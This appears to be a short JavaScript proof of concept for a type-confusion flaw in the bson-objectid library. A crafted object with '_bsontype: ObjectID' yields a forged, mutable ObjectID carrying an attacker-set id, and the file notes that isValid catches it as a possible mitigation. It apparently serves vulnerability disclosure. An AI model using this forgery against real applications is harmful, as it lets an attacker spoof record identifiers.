const ObjectID = require("bson-objectid");

// Working Examples
// console.log(ObjectID("54495ad94c934721ede76d90"));
// console.log(ObjectID("54495ad94c934721ede76d90").id);
// console.log(ObjectID.isValid(ObjectID("54495ad94c934721ede76d90")));

// Ordinarily, passing an object to ObjectID results in a TypeError error.
// console.log(ObjectID({"will_not_work": "totally"})); // Results in TypeError

// Attack Example
const payload = {
    "id": "BAD_ID",
    "hello": "world",
    "_bsontype" : "ObjectID"
};

let object_id_payload = ObjectID(payload)
console.log(object_id_payload.id) // Returns attacker specified id.
console.log(object_id_payload.hello) 
object_id_payload.hello = "goodbye" // Forged objectID object is mutable.
console.log(object_id_payload.hello)
object_id_payload.new = "hi"
console.log(object_id_payload)


console.log(ObjectID.isValid(object_id_payload)); // Forged ObjectID fails ObjectID.isValid check (potential mitigation)

